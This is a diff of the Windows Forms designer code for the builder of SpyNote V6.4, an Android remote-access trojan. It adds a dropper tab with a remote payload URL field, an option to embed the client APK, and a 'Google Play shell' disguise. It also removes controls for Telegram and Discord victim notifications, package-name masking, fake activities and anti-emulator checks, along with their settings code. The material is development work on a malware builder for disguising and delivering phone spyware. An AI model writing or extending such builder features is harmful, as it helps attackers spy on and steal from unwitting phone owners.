+        Me.btnBrowseDropperTemplate.Name = "btnBrowseDropperTemplate"
+        Me.btnBrowseDropperTemplate.Size = New System.Drawing.Size(70, 25)
+        Me.btnBrowseDropperTemplate.TabIndex = 5
+        Me.btnBrowseDropperTemplate.Text = "Browse"
+        Me.btnBrowseDropperTemplate.UseVisualStyleBackColor = False
+        '
+        'lblPayloadUrl
+        '
+        Me.lblPayloadUrl.AutoSize = True
+        Me.lblPayloadUrl.Location = New System.Drawing.Point(12, 112)
+        Me.lblPayloadUrl.Name = "lblPayloadUrl"
+        Me.lblPayloadUrl.Size = New System.Drawing.Size(122, 14)
+        Me.lblPayloadUrl.TabIndex = 6
+        Me.lblPayloadUrl.Text = "Remote payload URL:"
+        '
+        'txtPayloadUrl
+        '
+        Me.txtPayloadUrl.BackColor = System.Drawing.Color.FromArgb(CType(CType(20, Byte), Integer), CType(CType(20, Byte), Integer), CType(CType(20, Byte), Integer))
+        Me.txtPayloadUrl.BorderStyle = System.Windows.Forms.BorderStyle.FixedSingle
+        Me.txtPayloadUrl.ForeColor = System.Drawing.Color.FromArgb(CType(CType(241, Byte), Integer), CType(CType(241, Byte), Integer), CType(CType(241, Byte), Integer))
+        Me.txtPayloadUrl.Location = New System.Drawing.Point(140, 110)
+        Me.txtPayloadUrl.Name = "txtPayloadUrl"
+        Me.txtPayloadUrl.Size = New System.Drawing.Size(273, 20)
+        Me.txtPayloadUrl.TabIndex = 7
+        '
+        'chkEmbedPayload
+        '
+        Me.chkEmbedPayload.AutoSize = True
+        Me.chkEmbedPayload.Checked = True
+        Me.chkEmbedPayload.CheckState = System.Windows.Forms.CheckState.Checked
+        Me.chkEmbedPayload.ForeColor = System.Drawing.Color.FromArgb(CType(CType(241, Byte), Integer), CType(CType(241, Byte), Integer), CType(CType(241, Byte), Integer))
+        Me.chkEmbedPayload.Location = New System.Drawing.Point(12, 140)
+        Me.chkEmbedPayload.Name = "chkEmbedPayload"
+        Me.chkEmbedPayload.Size = New System.Drawing.Size(292, 18)
+        Me.chkEmbedPayload.TabIndex = 8
+        Me.chkEmbedPayload.Text = "Embed client APK inside dropper (works offline)"
+        Me.chkEmbedPayload.UseVisualStyleBackColor = False
+        '
+        'lblDropperHint
+        '
+        Me.lblDropperHint.ForeColor = System.Drawing.Color.FromArgb(CType(CType(190, Byte), Integer), CType(CType(190, Byte), Integer), CType(CType(190, Byte), Integer))
+        Me.lblDropperHint.Location = New System.Drawing.Point(12, 168)
+        Me.lblDropperHint.Name = "lblDropperHint"
+        Me.lblDropperHint.Size = New System.Drawing.Size(410, 36)
+        Me.lblDropperHint.TabIndex = 9
+        Me.lblDropperHint.Text = "Built-in Google Play shell used when template is empty. Output: Resources\Dropper" &
+    "" & Global.Microsoft.VisualBasic.ChrW(13) & Global.Microsoft.VisualBasic.ChrW(10) & "Dropper_final.apk"
         '
         'TabPage1
         '
-        Me.TabPage1.BackColor = System.Drawing.Color.FromArgb(CType(CType(45, Byte), Integer), CType(CType(45, Byte), Integer), CType(CType(48, Byte), Integer))
+        Me.TabPage1.BackColor = System.Drawing.Color.FromArgb(CType(CType(20, Byte), Integer), CType(CType(20, Byte), Integer), CType(CType(20, Byte), Integer))
         Me.TabPage1.Controls.Add(Me.Panel2)
         Me.TabPage1.Controls.Add(Me.Panel1)
         Me.TabPage1.Location = New System.Drawing.Point(4, 54)
@@ -683,7 +1058,7 @@ Partial Class Build
         '
         'TabPage2
         '
-        Me.TabPage2.BackColor = System.Drawing.Color.FromArgb(CType(CType(45, Byte), Integer), CType(CType(45, Byte), Integer), CType(CType(48, Byte), Integer))
+        Me.TabPage2.BackColor = System.Drawing.Color.FromArgb(CType(CType(20, Byte), Integer), CType(CType(20, Byte), Integer), CType(CType(20, Byte), Integer))
         Me.TabPage2.Controls.Add(Me.Panel3)
         Me.TabPage2.Location = New System.Drawing.Point(4, 54)
         Me.TabPage2.Name = "TabPage2"
@@ -788,7 +1163,7 @@ Partial Class Build
         '
         'TabPage4
         '
-        Me.TabPage4.BackColor = System.Drawing.Color.FromArgb(CType(CType(45, Byte), Integer), CType(CType(45, Byte), Integer), CType(CType(48, Byte), Integer))
+        Me.TabPage4.BackColor = System.Drawing.Color.FromArgb(CType(CType(20, Byte), Integer), CType(CType(20, Byte), Integer), CType(CType(20, Byte), Integer))
         Me.TabPage4.Controls.Add(Me.Panel5)
         Me.TabPage4.Location = New System.Drawing.Point(4, 54)
         Me.TabPage4.Name = "TabPage4"
@@ -836,7 +1211,8 @@ Partial Class Build
         '
         'LEDACC1
         '
-        Me.LEDACC1.Colour0 = System.Drawing.Color.Black
+        Me.LEDACC1.BackColor = System.Drawing.Color.FromArgb(CType(CType(20, Byte), Integer), CType(CType(20, Byte), Integer), CType(CType(20, Byte), Integer))
+        Me.LEDACC1.Colour0 = System.Drawing.Color.FromArgb(CType(CType(192, Byte), Integer), CType(CType(0, Byte), Integer), CType(CType(0, Byte), Integer))
         Me.LEDACC1.Colour1 = System.Drawing.Color.Black
         Me.LEDACC1.Location = New System.Drawing.Point(127, 98)
         Me.LEDACC1.Name = "LEDACC1"
@@ -846,7 +1222,7 @@ Partial Class Build
         '
         'LEDACC0
         '
-        Me.LEDACC0.Colour0 = System.Drawing.Color.FromArgb(CType(CType(0, Byte), Integer), CType(CType(0, Byte), Integer), CType(CType(0, Byte), Integer))
+        Me.LEDACC0.Colour0 = System.Drawing.Color.FromArgb(CType(CType(192, Byte), Integer), CType(CType(0, Byte), Integer), CType(CType(0, Byte), Integer))
         Me.LEDACC0.Colour1 = System.Drawing.Color.FromArgb(CType(CType(0, Byte), Integer), CType(CType(0, Byte), Integer), CType(CType(0, Byte), Integer))
         Me.LEDACC0.Location = New System.Drawing.Point(11, 91)
         Me.LEDACC0.Name = "LEDACC0"
@@ -856,7 +1232,7 @@ Partial Class Build
         '
         'LED3
         '
-        Me.LED3.Colour0 = System.Drawing.Color.Black
+        Me.LED3.Colour0 = System.Drawing.Color.FromArgb(CType(CType(192, Byte), Integer), CType(CType(0, Byte), Integer), CType(CType(0, Byte), Integer))
         Me.LED3.Colour1 = System.Drawing.Color.Black
         Me.LED3.Location = New System.Drawing.Point(9, 98)
         Me.LED3.Name = "LED3"
@@ -866,7 +1242,7 @@ Partial Class Build
         '
         'LED2
         '
-        Me.LED2.Colour0 = System.Drawing.Color.Black
+        Me.LED2.Colour0 = System.Drawing.Color.FromArgb(CType(CType(192, Byte), Integer), CType(CType(0, Byte), Integer), CType(CType(0, Byte), Integer))
         Me.LED2.Colour1 = System.Drawing.Color.Black
         Me.LED2.Location = New System.Drawing.Point(9, 52)
         Me.LED2.Name = "LED2"
@@ -890,7 +1266,7 @@ Partial Class Build
         '
         'LEDHID
         '
-        Me.LEDHID.Colour0 = System.Drawing.Color.FromArgb(CType(CType(0, Byte), Integer), CType(CType(0, Byte), Integer), CType(CType(0, Byte), Integer))
+        Me.LEDHID.Colour0 = System.Drawing.Color.FromArgb(CType(CType(192, Byte), Integer), CType(CType(0, Byte), Integer), CType(CType(0, Byte), Integer))
         Me.LEDHID.Colour1 = System.Drawing.Color.FromArgb(CType(CType(0, Byte), Integer), CType(CType(0, Byte), Integer), CType(CType(0, Byte), Integer))
         Me.LEDHID.Location = New System.Drawing.Point(11, 45)
         Me.LEDHID.Name = "LEDHID"
@@ -914,7 +1290,7 @@ Partial Class Build
         '
         'LEDDROOT
         '
-        Me.LEDDROOT.Colour0 = System.Drawing.Color.FromArgb(CType(CType(0, Byte), Integer), CType(CType(0, Byte), Integer), CType(CType(0, Byte), Integer))
+        Me.LEDDROOT.Colour0 = System.Drawing.Color.FromArgb(CType(CType(192, Byte), Integer), CType(CType(0, Byte), Integer), CType(CType(0, Byte), Integer))
         Me.LEDDROOT.Colour1 = System.Drawing.Color.FromArgb(CType(CType(0, Byte), Integer), CType(CType(0, Byte), Integer), CType(CType(0, Byte), Integer))
         Me.LEDDROOT.Location = New System.Drawing.Point(11, 204)
         Me.LEDDROOT.Name = "LEDDROOT"
@@ -938,7 +1314,7 @@ Partial Class Build
         '
         'LEDDEV
         '
-        Me.LEDDEV.Colour0 = System.Drawing.Color.FromArgb(CType(CType(0, Byte), Integer), CType(CType(0, Byte), Integer), CType(CType(0, Byte), Integer))
+        Me.LEDDEV.Colour0 = System.Drawing.Color.FromArgb(CType(CType(192, Byte), Integer), CType(CType(0, Byte), Integer), CType(CType(0, Byte), Integer))
         Me.LEDDEV.Colour1 = System.Drawing.Color.FromArgb(CType(CType(0, Byte), Integer), CType(CType(0, Byte), Integer), CType(CType(0, Byte), Integer))
         Me.LEDDEV.Location = New System.Drawing.Point(11, 160)
         Me.LEDDEV.Name = "LEDDEV"
@@ -962,7 +1338,7 @@ Partial Class Build
         '
         'LED4
         '
-        Me.LED4.Colour0 = System.Drawing.Color.Black
+        Me.LED4.Colour0 = System.Drawing.Color.FromArgb(CType(CType(192, Byte), Integer), CType(CType(0, Byte), Integer), CType(CType(0, Byte), Integer))
         Me.LED4.Colour1 = System.Drawing.Color.Black
         Me.LED4.Location = New System.Drawing.Point(9, 128)
         Me.LED4.Name = "LED4"
@@ -972,7 +1348,8 @@ Partial Class Build
         '
         'LEDACC2
         '
-        Me.LEDACC2.Colour0 = System.Drawing.Color.FromArgb(CType(CType(0, Byte), Integer), CType(CType(0, Byte), Integer), CType(CType(0, Byte), Integer))
+        Me.LEDACC2.BackColor = System.Drawing.Color.FromArgb(CType(CType(20, Byte), Integer), CType(CType(20, Byte), Integer), CType(CType(20, Byte), Integer))
+        Me.LEDACC2.Colour0 = System.Drawing.Color.FromArgb(CType(CType(192, Byte), Integer), CType(CType(0, Byte), Integer), CType(CType(0, Byte), Integer))
         Me.LEDACC2.Colour1 = System.Drawing.Color.FromArgb(CType(CType(0, Byte), Integer), CType(CType(0, Byte), Integer), CType(CType(0, Byte), Integer))
         Me.LEDACC2.Location = New System.Drawing.Point(127, 128)
         Me.LEDACC2.Name = "LEDACC2"
@@ -982,7 +1359,7 @@ Partial Class Build
         '
         'LED1
         '
-        Me.LED1.Colour0 = System.Drawing.Color.Black
+        Me.LED1.Colour0 = System.Drawing.Color.FromArgb(CType(CType(192, Byte), Integer), CType(CType(0, Byte), Integer), CType(CType(0, Byte), Integer))
         Me.LED1.Colour1 = System.Drawing.Color.Black
         Me.LED1.Location = New System.Drawing.Point(9, 30)
         Me.LED1.Name = "LED1"
@@ -1006,7 +1383,7 @@ Partial Class Build
         '
         'LED5
         '
-        Me.LED5.Colour0 = System.Drawing.Color.Black
+        Me.LED5.Colour0 = System.Drawing.Color.FromArgb(CType(CType(192, Byte), Integer), CType(CType(0, Byte), Integer), CType(CType(0, Byte), Integer))
         Me.LED5.Colour1 = System.Drawing.Color.Black
         Me.LED5.Location = New System.Drawing.Point(9, 167)
         Me.LED5.Name = "LED5"
@@ -1071,7 +1448,7 @@ Partial Class Build
         '
         'TabPage5
         '
-        Me.TabPage5.BackColor = System.Drawing.Color.FromArgb(CType(CType(45, Byte), Integer), CType(CType(45, Byte), Integer), CType(CType(48, Byte), Integer))
+        Me.TabPage5.BackColor = System.Drawing.Color.FromArgb(CType(CType(20, Byte), Integer), CType(CType(20, Byte), Integer), CType(CType(20, Byte), Integer))
         Me.TabPage5.Controls.Add(Me.Panel6)
         Me.TabPage5.Location = New System.Drawing.Point(4, 54)
         Me.TabPage5.Name = "TabPage5"
@@ -1155,7 +1532,7 @@ Partial Class Build
         '
         'TabPage3
         '
-        Me.TabPage3.BackColor = System.Drawing.Color.FromArgb(CType(CType(45, Byte), Integer), CType(CType(45, Byte), Integer), CType(CType(48, Byte), Integer))
+        Me.TabPage3.BackColor = System.Drawing.Color.FromArgb(CType(CType(20, Byte), Integer), CType(CType(20, Byte), Integer), CType(CType(20, Byte), Integer))
         Me.TabPage3.Controls.Add(Me.Panel4)
         Me.TabPage3.Location = New System.Drawing.Point(4, 54)
         Me.TabPage3.Name = "TabPage3"
@@ -1214,11 +1591,11 @@ Partial Class Build
         '
         Me.AutoScaleDimensions = New System.Drawing.SizeF(7.0!, 14.0!)
         Me.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font
-        Me.BackColor = System.Drawing.Color.FromArgb(CType(CType(45, Byte), Integer), CType(CType(45, Byte), Integer), CType(CType(48, Byte), Integer))
+        Me.BackColor = System.Drawing.Color.FromArgb(CType(CType(20, Byte), Integer), CType(CType(20, Byte), Integer), CType(CType(20, Byte), Integer))
         Me.ClientSize = New System.Drawing.Size(493, 480)
         Me.Controls.Add(Me.ThemeTabControl1)
         Me.Font = New System.Drawing.Font("Arial", 8.25!, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, CType(0, Byte))
-        Me.ForeColor = System.Drawing.Color.FromArgb(CType(CType(170, Byte), Integer), CType(CType(170, Byte), Integer), CType(CType(170, Byte), Integer))
+        Me.ForeColor = System.Drawing.Color.Maroon
         Me.FormBorderStyle = System.Windows.Forms.FormBorderStyle.FixedSingle
         Me.MaximizeBox = False
         Me.MinimizeBox = False
@@ -1238,6 +1615,11 @@ Partial Class Build
         Me.Panel8.ResumeLayout(False)
         Me.grpProtectionOptions.ResumeLayout(False)
         Me.grpProtectionOptions.PerformLayout()
+        CType(Me.numDelayMinutes, System.ComponentModel.ISupportInitialize).EndInit()
+        Me.TabPageDropper.ResumeLayout(False)
+        Me.PanelDropper.ResumeLayout(False)
+        Me.grpDropper_Dropper.ResumeLayout(False)
+        Me.grpDropper_Dropper.PerformLayout()
         Me.TabPage1.ResumeLayout(False)
         Me.Panel2.ResumeLayout(False)
         Me.Panel2.PerformLayout()
@@ -1266,205 +1648,5 @@ Partial Class Build
         Me.ResumeLayout(False)
 
     End Sub
-
-    ' ----- Объявления элементов управления (включая новые) -----
-    Friend WithEvents ThemeTabControl1 As SpyNote_V6._4.SN.ThemeTabControl
-
-    Friend WithEvents btnBrowseTemplate As Button
-    Friend WithEvents lblTemplate As Label
-    Private grpDropper As GroupBox
-    Private tabPageDropper As TabPage
-    Friend WithEvents TabPage1 As System.Windows.Forms.TabPage
-    Friend WithEvents Panel1 As System.Windows.Forms.Panel
-    Friend WithEvents ThemeButton1 As SpyNote_V6._4.SN.ThemeButton
-    Friend WithEvents TabPage2 As System.Windows.Forms.TabPage
-    Friend WithEvents PictureBox1 As System.Windows.Forms.PictureBox
-    Friend WithEvents Label1 As System.Windows.Forms.Label
-    Friend WithEvents Panel2 As System.Windows.Forms.Panel
-    Friend WithEvents Label2 As System.Windows.Forms.Label
-    Friend WithEvents Label5 As System.Windows.Forms.Label
-    Friend WithEvents Label4 As System.Windows.Forms.Label
-    Friend WithEvents Label3 As System.Windows.Forms.Label
-    Friend WithEvents TextBox4 As System.Windows.Forms.TextBox
-    Friend WithEvents TextBox3 As System.Windows.Forms.TextBox
-    Friend WithEvents TextBox2 As System.Windows.Forms.TextBox
-    Friend WithEvents TextBox1 As System.Windows.Forms.TextBox
-    Friend WithEvents Panel3 As System.Windows.Forms.Panel
-    Friend WithEvents TextBox6 As System.Windows.Forms.TextBox
-    Friend WithEvents Label7 As System.Windows.Forms.Label
-    Friend WithEvents TextBox5 As System.Windows.Forms.TextBox
-    Friend WithEvents Label6 As System.Windows.Forms.Label
-    Friend WithEvents TextBox7 As System.Windows.Forms.TextBox
-    Friend WithEvents Label8 As System.Windows.Forms.Label
-    Friend WithEvents Pi6 As SpyNote_V6._4.SN.PI
-    Friend WithEvents TabPage4 As System.Windows.Forms.TabPage
-    Friend WithEvents Panel5 As System.Windows.Forms.Panel
-    Friend WithEvents LED5 As SpyNote_V6._4.SN.LinearLine
-    Friend WithEvents Label12 As System.Windows.Forms.Label
-    Friend WithEvents Label11 As System.Windows.Forms.Label
-    Friend WithEvents Label10 As System.Windows.Forms.Label
-    Friend WithEvents Label9 As System.Windows.Forms.Label
-    Friend WithEvents Label13 As System.Windows.Forms.Label
-    Friend WithEvents LEDDEV As SpyNote_V6._4.SN.ThemeSeparator
-    Friend WithEvents Pi4 As SpyNote_V6._4.SN.PI
-    Friend WithEvents LED4 As SpyNote_V6._4.SN.LinearLine
-    Friend WithEvents LEDACC2 As SpyNote_V6._4.SN.ThemeSeparator
-    Friend WithEvents LED1 As SpyNote_V6._4.SN.LinearLine
-    Friend WithEvents Pi3 As SpyNote_V6._4.SN.PI
-    Friend WithEvents LEDHID As SpyNote_V6._4.SN.ThemeSeparator
-    Friend WithEvents Pi1 As SpyNote_V6._4.SN.PI
-    Friend WithEvents LEDDROOT As SpyNote_V6._4.SN.ThemeSeparator
-    Friend WithEvents Pi5 As SpyNote_V6._4.SN.PI
-    Friend WithEvents LEDACC0 As SpyNote_V6._4.SN.ThemeSeparator
-    Friend WithEvents LED3 As SpyNote_V6._4.SN.LinearLine
-    Friend WithEvents LED2 As SpyNote_V6._4.SN.LinearLine
-    Friend WithEvents Pi2 As SpyNote_V6._4.SN.PI
-    Friend WithEvents PictureBox2 As System.Windows.Forms.PictureBox
-    Friend WithEvents LEDACC1 As SpyNote_V6._4.SN.LinearLine
-    Friend WithEvents TabPage5 As System.Windows.Forms.TabPage
-    Friend WithEvents Panel6 As System.Windows.Forms.Panel
-    Friend WithEvents ThemeButton3 As SpyNote_V6._4.SN.ThemeButton
-    Friend WithEvents TextBox8 As System.Windows.Forms.TextBox
-    Friend WithEvents Label15 As System.Windows.Forms.Label
-    Friend WithEvents Label14 As System.Windows.Forms.Label
-    Friend WithEvents TabPage3 As System.Windows.Forms.TabPage
-    Friend WithEvents Panel4 As System.Windows.Forms.Panel
-    Friend WithEvents PBil As System.Windows.Forms.PictureBox
-    Friend WithEvents ThemeButton2 As SpyNote_V6._4.SN.ThemeButton
-    Friend WithEvents Trans As System.Windows.Forms.Timer
-
-    ' ----- НОВЫЕ ЭЛЕМЕНТЫ -----
-    Friend WithEvents TabPage6 As System.Windows.Forms.TabPage
-    Friend WithEvents Panel7 As System.Windows.Forms.Panel
-    Friend WithEvents btnTestNotify As SpyNote_V6._4.SN.ThemeButton
-    Friend WithEvents chkEnableNotify As System.Windows.Forms.CheckBox
-    Friend WithEvents cbNotifyType As System.Windows.Forms.ComboBox
-    Friend WithEvents lblNotifyType As System.Windows.Forms.Label
-    Friend WithEvents grpTelegram As System.Windows.Forms.GroupBox
-    Friend WithEvents txtTelegramToken As System.Windows.Forms.TextBox
-    Friend WithEvents lblTelegramToken As System.Windows.Forms.Label
-    Friend WithEvents txtTelegramChatId As System.Windows.Forms.TextBox
-    Friend WithEvents lblTelegramChatId As System.Windows.Forms.Label
-    Friend WithEvents grpDiscord As System.Windows.Forms.GroupBox
-    Friend WithEvents txtDiscordWebhook As System.Windows.Forms.TextBox
-    Friend WithEvents lblDiscordWebhook As System.Windows.Forms.Label
-
-
-    ' ----- PROTECTION TAB ELEMENTS -----
-    Friend WithEvents TabPage7 As System.Windows.Forms.TabPage
-    Friend WithEvents Panel8 As System.Windows.Forms.Panel
-    Friend WithEvents grpProtectionOptions As System.Windows.Forms.GroupBox
-    Friend WithEvents chkEnableProtection As System.Windows.Forms.CheckBox
-    Friend WithEvents txtPackageName As System.Windows.Forms.TextBox
-    Friend WithEvents lblPackageName As System.Windows.Forms.Label
-    Friend WithEvents cbMaskType As System.Windows.Forms.ComboBox
-    Friend WithEvents lblMaskType As System.Windows.Forms.Label
-    Friend WithEvents txtFakeActivity As System.Windows.Forms.TextBox
-    Friend WithEvents lblFakeActivity As System.Windows.Forms.Label
-    Friend WithEvents chkAntiEmulator As System.Windows.Forms.CheckBox
-    Friend WithEvents chkDropperMode As System.Windows.Forms.CheckBox
-    Friend WithEvents btnGeneratePackage As SpyNote_V6._4.SN.ThemeButton
-
-
-    ' ----- ЛОГИКА (добавлено) -----
-
-    ' Build_Load handler is implemented in Build.vb. Designer should not define duplicate handlers.
-
-    Private Sub SaveSettings()
-        Try
-            ' Use a simple delimiter-based storage to avoid depending on JsonConvert here.
-            Dim delim As Char = ChrW(31) ' unit separator, unlikely to appear in normal input
-            Dim parts As String() = New String() {
-                chkEnableNotify.Checked.ToString(),
-                If(cbNotifyType.SelectedItem IsNot Nothing, cbNotifyType.SelectedItem.ToString(), String.Empty),
-                txtTelegramToken.Text,
-                txtTelegramChatId.Text,
-                txtDiscordWebhook.Text
-            }
-            Dim serialized As String = String.Join(delim, parts)
-            My.Settings("NotifySettings") = serialized
-            My.Settings.Save()
-        Catch ex As Exception
-            ' Ignore save errors
-        End Try
-    End Sub
-
-    Private Sub LoadSettings()
-        Try
-            Dim raw As String = If(My.Settings("NotifySettings") IsNot Nothing, My.Settings("NotifySettings").ToString(), String.Empty)
-            If Not String.IsNullOrEmpty(raw) Then
-                Dim delim As Char = ChrW(31)
-                Dim parts As String() = raw.Split(delim)
-                If parts.Length >= 5 Then
-                    chkEnableNotify.Checked = Convert.ToBoolean(parts(0))
-                    If Not String.IsNullOrEmpty(parts(1)) Then
-                        cbNotifyType.SelectedItem = parts(1)
-                    End If
-                    txtTelegramToken.Text = parts(2)
-                    txtTelegramChatId.Text = parts(3)
-                    txtDiscordWebhook.Text = parts(4)
-                End If
-            End If
-        Catch
-            cbNotifyType.SelectedIndex = 0
-            chkEnableNotify.Checked = False
-        End Try
-    End Sub
-
-    Private Sub UpdateVisibility()
-        grpTelegram.Visible = (cbNotifyType.SelectedItem IsNot Nothing AndAlso cbNotifyType.SelectedItem.ToString() = "Telegram")
-        grpDiscord.Visible = (cbNotifyType.SelectedItem IsNot Nothing AndAlso cbNotifyType.SelectedItem.ToString() = "Discord")
-    End Sub
-
-    Private Sub cbNotifyType_SelectedIndexChanged(sender As Object, e As EventArgs) Handles cbNotifyType.SelectedIndexChanged
-        UpdateVisibility()
-        SaveSettings()
-    End Sub
-
-    Private Sub chkEnableNotify_CheckedChanged(sender As Object, e As EventArgs) Handles chkEnableNotify.CheckedChanged
-        SaveSettings()
-    End Sub
-
-    Private Sub txtTelegramToken_TextChanged(sender As Object, e As EventArgs) Handles txtTelegramToken.TextChanged
-        SaveSettings()
-    End Sub
-
-    Private Sub txtTelegramChatId_TextChanged(sender As Object, e As EventArgs) Handles txtTelegramChatId.TextChanged
-        SaveSettings()
-    End Sub
-
-    Private Sub txtDiscordWebhook_TextChanged(sender As Object, e As EventArgs) Handles txtDiscordWebhook.TextChanged
-        SaveSettings()
-    End Sub
-
-    Private Sub btnTestNotify_Click(sender As Object, e As EventArgs) Handles btnTestNotify.Click
-        btnTestNotify.Enabled = False
-        SaveSettings()
-        Dim cfg As New NotifySettingsHelper.NotifyConfig With {
-            .Enabled = chkEnableNotify.Checked,
-            .NotifyType = If(cbNotifyType.SelectedItem IsNot Nothing, cbNotifyType.SelectedItem.ToString(), "Telegram"),
-            .TelegramToken = txtTelegramToken.Text.Trim(),
-            .TelegramChatId = txtTelegramChatId.Text.Trim(),
-            .DiscordWebhook = txtDiscordWebhook.Text.Trim()
-        }
-        NotifySettingsHelper.SaveNotifyConfig(cfg)
-
-        If Not cfg.Enabled Then
-            MessageBox.Show("Notifications are disabled.", "Info", MessageBoxButtons.OK, MessageBoxIcon.Information)
-            btnTestNotify.Enabled = True
-            Return
-        End If
-
-        Dim success As Boolean = DeviceNotifyService.SendTestNotification(cfg, "Builder test")
-        If success Then
-            MessageBox.Show("Test notification sent successfully.", "Success", MessageBoxButtons.OK, MessageBoxIcon.Information)
-        Else
-            MessageBox.Show("Failed to send notification. Check token/chat id or webhook.", "Error", MessageBoxButtons.OK, MessageBoxIcon.Error)
-        End If
-        btnTestNotify.Enabled = True
-    End Sub
-
-    ' Designer-only code (event handler removed to avoid duplicate definitions).
-
 End Class
 
